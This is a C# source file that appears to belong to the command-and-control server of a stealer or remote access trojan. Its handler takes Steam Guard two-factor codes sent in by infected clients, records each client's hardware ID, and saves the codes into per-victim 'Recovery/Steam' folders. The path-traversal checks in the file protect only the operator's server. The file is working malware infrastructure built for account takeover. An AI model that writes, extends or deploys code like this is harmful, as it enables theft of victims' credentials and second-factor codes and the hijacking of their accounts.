using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerSteamGuard
{
	public static void Read(Clients clients, object[] array)
	{
		try
		{
			if (clients == null || array == null || array.Length < 2)
			{
				return;
			}
			if (array[1] as string == "Ready")
			{
				if (array.Length >= 3 && array[2] is string hwid)
				{
					clients.Hwid = hwid;
				}
			}
			else
			{
				if (array.Length < 3)
				{
					return;
				}
				string userId = array[1] as string;
				if (string.IsNullOrWhiteSpace(userId))
				{
					return;
				}
				string sanitizedUserId = SecurityHelper.SanitizeHwid(userId);
				if (string.IsNullOrEmpty(sanitizedUserId) || sanitizedUserId == "Unknown" || sanitizedUserId == "InvalidHWID")
				{
					Methods.AppendLogs(clients.IP, "RCE Attack Blocked! Invalid userId (SteamGuard)", Color.Red);
					return;
				}
				string baseUsersPath = Path.GetFullPath("Users");
				string userPath = Path.GetFullPath(Path.Combine("Users", sanitizedUserId));
				if (!userPath.StartsWith(baseUsersPath, StringComparison.OrdinalIgnoreCase))
				{
					Methods.AppendLogs(clients.IP, "RCE Attack Blocked! Path Traversal (SteamGuard)", Color.Red);
					return;
				}
				string code = array[2]?.ToString() ?? "Unknown";
				string recoveryPath = Path.Combine(userPath, "Recovery", "Steam");
				Directory.CreateDirectory(recoveryPath);
				Methods.AppendLogs(clients.IP, "SteamGuard code saved in to: " + recoveryPath, Color.MediumPurple);
				File.WriteAllText(Path.Combine(recoveryPath, "SteamGuard_Code.txt"), "Code: " + code);
			}
		}
		catch
		{
		}
		finally
		{
			if (clients != null && array != null && array.Length >= 2 && array[1] as string != "Ready")
			{
				clients.Disconnect();
			}
		}
	}
}
